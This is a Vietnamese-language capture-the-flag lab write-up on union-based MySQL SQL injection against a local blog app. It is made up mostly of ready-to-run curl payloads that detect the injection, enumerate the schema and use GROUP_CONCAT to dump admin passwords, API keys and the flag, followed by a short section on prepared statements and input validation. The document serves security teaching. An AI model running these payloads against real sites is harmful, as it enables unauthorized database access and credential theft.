# SQLi-021: MySQL Union-based Multi Row - Complete Writeup

## 📋 Tóm Tắt

Bài lab này yêu cầu khai thác SQL Injection trên MySQL sử dụng kỹ thuật **Union-based** với `GROUP_CONCAT()` để aggregate nhiều rows thành 1 string.

**Độ khó:** Medium  
**Kỹ thuật:** MySQL Union-based với GROUP_CONCAT  
**Mục tiêu:** Trích xuất flag và API keys từ bảng `admin_users`

---

## 🔍 Bước 1: DETECT - Tìm Điểm Chèn

### 1.1 Khám phá ứng dụng

Truy cập URL: `http://localhost:5021/`

Blog hiển thị các bài post và comments. Xem comments của bài viết:

```
http://localhost:5021/post?id=1
```

**Response:** Hiển thị post content và list comments.

### 1.2 Phát hiện SQL Injection

```bash
# Test 1: Single quote
curl "http://localhost:5021/post?id=1'"
# ❌ Error: (1064, "You have an error in your SQL syntax...")

# Test 2: Boolean logic
curl "http://localhost:5021/post?id=1 AND 1=1"
# ✅ Hiển thị comments bình thường

curl "http://localhost:5021/post?id=1 AND 1=2"
# ❌ Không có comments
```

**Kết luận:** SQL Injection xác nhận tại parameter `id`!

---

## 🎯 Bước 2: IDENTIFY - Xác Định Database

### 2.1 Xác định DBMS từ error

```
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...")
```

→ **MySQL** confirmed!

---

## 🔢 Bước 3: ENUMERATE - Liệt Kê Cấu Trúc

### 3.1 Xác định số columns

```bash
# Query comments có 2 columns (username, comment_text)
curl "http://localhost:5021/post?id=0 UNION SELECT NULL,NULL-- -"
# ✅ Hoạt động

curl "http://localhost:5021/post?id=0 UNION SELECT NULL,NULL,NULL-- -"
# ❌ Error: columns mismatch
```

→ Query trả về **2 columns**!

### 3.2 Test UNION với data

```bash
curl "http://localhost:5021/post?id=0 UNION SELECT 'user1','text1'-- -"
# ✅ Hiển thị 1 comment với username="user1", text="text1"
```

### 3.3 Enumerate tables

```bash
# Dùng GROUP_CONCAT để lấy tất cả tables
curl "http://localhost:5021/post?id=0 UNION SELECT 'TABLES',GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"
```

**Result:**

```
username: TABLES
text: admin_users,comments,posts,secrets
```

### 3.4 Enumerate columns trong admin_users

```bash
curl "http://localhost:5021/post?id=0 UNION SELECT 'COLUMNS',GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='admin_users'-- -"
```

**Result:**

```
username: COLUMNS
text: id,username,password,email,role,api_key
```

---

## 📤 Bước 4: EXTRACT - Lấy Dữ Liệu

### 4.1 Vấn đề: Nhiều admin users

Nếu dùng query thông thường:

```sql
0 UNION SELECT username, password FROM admin_users-- -
```

→ Trả về nhiều rows, mỗi row 1 user.

### 4.2 Giải pháp: GROUP_CONCAT

Aggregate tất cả users thành 1 row:

```bash
# Lấy tất cả username:password
curl "http://localhost:5021/post?id=0 UNION SELECT 'USERS',GROUP_CONCAT(CONCAT_WS(':',username,password) SEPARATOR '<br>') FROM admin_users-- -"
```

**Result:**

```
username: USERS
text: superadmin:Sup3r_Adm1n_P@ss!<br>admin:Adm1n_2024_S3cure<br>editor:Ed1t0r_P@ssw0rd<br>moderator:M0d_S3cur3_2024
```

### 4.3 Lấy thông tin đầy đủ

```bash
curl "http://localhost:5021/post?id=0 UNION SELECT 'ALL_DATA',GROUP_CONCAT(CONCAT_WS(' | ',username,password,email,role) SEPARATOR '<br>') FROM admin_users-- -"
```

**Result:**

```
superadmin | Sup3r_Adm1n_P@ss! | superadmin@blog.local | superadmin
admin | Adm1n_2024_S3cure | admin@blog.local | admin
editor | Ed1t0r_P@ssw0rd | editor@blog.local | editor
moderator | M0d_S3cur3_2024 | mod@blog.local | moderator
```

---

## ⬆️ Bước 5: ESCALATE - Leo Thang Quyền

### 5.1 Extract API Keys

```bash
curl "http://localhost:5021/post?id=0 UNION SELECT 'API_KEYS',GROUP_CONCAT(CONCAT_WS(':',username,api_key) SEPARATOR '<br>') FROM admin_users-- -"
```

**Result:**

```
superadmin:demo_key_4eC39HqLyjWDarjtT1zdp7dc
admin:demo_key_7fG82KmNopQRstuV2wxyZ3ab
editor:demo_key_9hI04LnOpQrStUvW4xyzA5cd
moderator:demo_key_2jK16MnPqRsTuVwX5yzaB6ef
```

### 5.2 Identify highest privilege account

```
superadmin:Sup3r_Adm1n_P@ss! (role: superadmin)
```

→ Đây là account có quyền cao nhất!

---

## 🏆 Bước 6: EXFILTRATE - Trích Xuất Flag

### 6.1 Lấy flag từ bảng secrets

```bash
curl "http://localhost:5021/post?id=0 UNION SELECT 'FLAG',GROUP_CONCAT(CONCAT_WS(':',name,value)) FROM secrets-- -"
```

**Result:**

```
username: FLAG
text: sqli_021:FLAG{gr0up_c0nc4t_4ggr3g4t3}
```

### 6.2 Lấy trực tiếp value

```bash
curl "http://localhost:5021/post?id=0 UNION SELECT 'FLAG',value FROM secrets WHERE name='sqli_021'-- -"
```

**Result:**

```
FLAG{gr0up_c0nc4t_4ggr3g4t3}
```

🎉 **FLAG:** `FLAG{gr0up_c0nc4t_4ggr3g4t3}`

---

## 📝 Summary of Exploitation Chain

```
1. DETECT      → Single quote triggers SQL error
2. IDENTIFY    → MySQL (error message pattern)
3. ENUMERATE   → 2 columns, 4 tables (using GROUP_CONCAT)
4. EXTRACT     → GROUP_CONCAT + CONCAT_WS for all users
5. ESCALATE    → Found superadmin + API keys
6. EXFILTRATE  → FLAG{gr0up_c0nc4t_4ggr3g4t3}
```

**Complete Payload Sequence:**

```bash
# Step 1: Detect SQLi
curl "http://localhost:5021/post?id=1'"

# Step 2: Find column count
curl "http://localhost:5021/post?id=0 UNION SELECT NULL,NULL-- -"

# Step 3: Enumerate tables
curl "http://localhost:5021/post?id=0 UNION SELECT 'x',GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"

# Step 4: Enumerate columns
curl "http://localhost:5021/post?id=0 UNION SELECT 'x',GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='admin_users'-- -"

# Step 5: Extract all users
curl "http://localhost:5021/post?id=0 UNION SELECT 'x',GROUP_CONCAT(CONCAT_WS(':',username,password,api_key) SEPARATOR '<br>') FROM admin_users-- -"

# Step 6: Get flag
curl "http://localhost:5021/post?id=0 UNION SELECT 'x',value FROM secrets-- -"
```

---

## 🎓 Bài Học Quan Trọng

### 1. GROUP_CONCAT Syntax

```sql
GROUP_CONCAT(
    [DISTINCT] column_name
    [ORDER BY column_name ASC/DESC]
    [SEPARATOR 'delimiter']
)
```

**Default separator:** Comma (`,`)

### 2. Kết hợp GROUP_CONCAT + CONCAT_WS

```sql
-- Aggregate cả rows VÀ columns
GROUP_CONCAT(
    CONCAT_WS(':',username,password)  -- Ghép columns
    SEPARATOR '<br>'                   -- Ghép rows
)
```

### 3. Giới hạn GROUP_CONCAT

MySQL có giới hạn mặc định 1024 bytes. Nếu data lớn:

```sql
SET SESSION group_concat_max_len = 1000000;
```

### 4. Alternative: LIMIT + OFFSET

Nếu GROUP_CONCAT bị block:

```sql
' UNION SELECT username,password FROM admin_users LIMIT 0,1-- -
' UNION SELECT username,password FROM admin_users LIMIT 1,1-- -
' UNION SELECT username,password FROM admin_users LIMIT 2,1-- -
```

---

## 🛡️ Cách Phòng Chống

### 1. Prepared Statements

```python
# ❌ Vulnerable
sql = f"SELECT username, comment_text FROM comments WHERE post_id = {post_id}"

# ✅ Secure
sql = "SELECT username, comment_text FROM comments WHERE post_id = %s"
cursor.execute(sql, (post_id,))
```

### 2. Input Validation

```python
if not post_id.isdigit():
    return "Invalid post ID", 400
```

---

## 📚 References

- [MySQL GROUP_CONCAT](https://dev.mysql.com/doc/refman/8.0/en/aggregate-functions.html#function_group-concat)
- [PayloadsAllTheThings - MySQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

---

## ✅ Flag

```
FLAG{gr0up_c0nc4t_4ggr3g4t3}
```

**Ý nghĩa:**

- `gr0up` → GROUP (leet: o=0)
- `c0nc4t` → CONCAT (leet: o=0, a=4)
- `4ggr3g4t3` → aggregate (leet: a=4, e=3)

---

**🎯 Completed:** SQLi-021 - MySQL Union-based Multi Row Exploitation
